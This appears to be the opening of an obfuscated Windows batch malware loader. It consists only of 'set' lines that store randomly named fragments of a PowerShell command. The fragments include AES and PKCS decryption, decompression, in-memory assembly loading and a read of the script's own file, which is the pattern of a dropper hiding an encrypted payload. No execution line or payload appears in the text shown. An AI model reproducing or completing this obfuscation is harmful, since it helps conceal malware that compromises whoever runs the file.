@echo off
set "gPMNKmYcqQ=am;$"
set "YLGdfxEtgM=PxEW"
set "KbCblCnNcI=($Dd"
set "InlQiQsTVf= [Sy"
set "gjfylUvNjU=gnir"
set "NlNbXdaZaQ=[Sys"
set "QPksETKHKi=oin "
set "nfvdNLxmfE=.Ass"
set "xdHrYXzxvL=nirt"
set "jsDrQZubDw=yTo("
set "KOcXjmmyQB=ateD"
set "dqArvWBQmK=;$oS"
set "ZKLUqIjUUV=esMa"
set "hckaIWNDAy=YxVw"
set "OfsWvZPjRW=..-1"
set "EJlgfhTMsq=)) {"
set "YyYZCJloGh=.Sec"
set "HhUrhsTYYK=CFxo"
set "rOWCUkbDfK=New-"
set "iMufHMydig=zuZI"
set "HkqiCkiMnJ=fore"
set "MXAZtMtCRp=sion"
set "VHwiNkNytj=.Len"
set "YsExQFKitN=bstr"
set "YBFWXWACwj=::De"
set "kQblTPceIy='txe"
set "rUhtpfVPYk=comp"
set "UXPIxxxzHL=Disp"
set "ZSctSXAoIy=[]] "
set "UiLQhIlTJK=1] -"
set "nLhXGBduZp=);$G"
set "vTsZpTfjbD=l5E7"
set "YOegZPUPOk=mory"
set "FfxKfUKvnV=gjYA"
set "RxGVquxCjT=1..-"
set "CzMaOBThrQ=$wPD"
set "PKMBnzoWqs=O.Me"
set "KQTPmtsUEz=ss -"
set "gAvwuAVksP=);$w"
set "WnDASKSsWd=nB);"
set "MSGnkAmeIK=g = "
set "orlBUkvMhJ=ct S"
set "dUJnCgkTLx=y.Pa"
set "jIfNcWIgNW=Mode"
set "TnEIhiKdJT=Ddiy"
set "HIDRRMCRlK=pose"
set "GPrBqhLyAf=trea"
set "nWjenzITkz=TllA"
set "atMRrwKADL=y.Cr"
set "FUoUCtQswL=embl"
set "ZtYFfFnzQE=stem"
set "xBKWZhUWGe=k; }"
set "lDamzAQRaA=;$DA"
set "gguToCEfkN=ress"
set "FhfcPWQcbU=:: '"
set "tgSiIFygVt=[IO."
set "CzpCPpYKRv=PDeK"
set "ByUWBNICfZ=rt]:"
set "TyKdNoDybC=nUvl"
set "jWYjqSXCYa=dj0C"
set "GLyMRvurfb=.Com"
set "NMRxilfyWY=PKCS"
set "kKhGYPOtKZ= if "
set "oStChMAiCD='')("
set "QVRVKjQZVC=ypto"
set "gzwhRwQrDA=ring"
set "DDghizqClr== [S"
set "DvayPuWbrv=;$oS"
set "TEzHwvlMMU=tion"
set "kkxWHtuXaW=rtS4"
set "hokvlvjRxY=rity"
set "cmpkeIRxQg=rans"
set "KODbNgWEpL= '')"
set "ekHlgaLNLg=Z.Pa"
set "hvmQpTRNEg=morF"
set "NCFhBjbkGQ=daeR"
set "pDiLuRlFWw= = ["
set "ooWWdNZXYW=th('"
set "LMWnZJHqcI=lA, "
set "GXbUtzWEGw=O.Su"
set "ODosVPaafY=('%~f0'"
set "HfBUHalQaa=gsYZ"
set "WdqkXKsmKI=pStr"
set "ScTilFFsxL=);$D"
set "NGfasGPFZg=rity"
set "PwxbtWpTbh=  $h"
set "tYOylylVSS=-4] "
set "ZMQNGgAIBs='[-1"
set "RgmUlGJYxI=-joi"
set "JCWvhGixVd=)($j"
set "snjzlLrixz=ck($"
set "LyfAutrtHD=);$G"
set "iMcWTFcFSd=('%*'"
set "vvxcwVerWp= [Sy"
set "DbQFeOHoVE=urit"
set "IOvDYBlWoJ=bjec"
set "XKEEqlkMQR=Syst"
set "IianfJeRvK=comm"
set "XPxBBwxNin=6esa"
set "PqGAmciaLi=flec"
set "tszgPSErUv=);$R"
set "HobFAezoew=hZ.I"
set "ounvIiqGeb=.Cop"
